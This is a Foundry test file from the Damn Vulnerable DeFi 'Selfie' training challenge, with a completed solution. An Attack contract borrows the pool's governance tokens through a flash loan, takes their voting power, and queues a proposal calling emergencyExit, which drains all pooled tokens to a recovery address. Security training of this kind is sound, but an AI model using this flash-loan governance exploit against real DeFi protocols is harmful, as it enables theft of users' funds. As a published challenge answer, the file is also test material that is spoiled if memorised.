// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    address public immutable recovery;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    DamnValuableVotes public immutable token;

    constructor(
        address _recovery,
        address _governance,
        address _pool,
        address _token
    ) {
        recovery = _recovery;
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        token = DamnValuableVotes(_token);
        token.approve(address(pool), type(uint256).max);
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // Step 1: Delegate borrowed tokens to self for voting power
        token.delegate(address(this));

        // Step 2: Create malicious governance proposal
        bytes memory hackData = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            recovery
        );

        // Step 3: Queue the proposal (we have majority voting power!)
        governance.queueAction(address(pool), 0, hackData);

        return CALLBACK_SUCCESS;
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attack attack = new Attack(
            recovery,
            address(governance),
            address(pool),
            address(token)
        );

        pool.flashLoan(attack, address(token), TOKENS_IN_POOL, "");

        vm.warp(block.timestamp + 2 days);

        governance.executeAction(1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
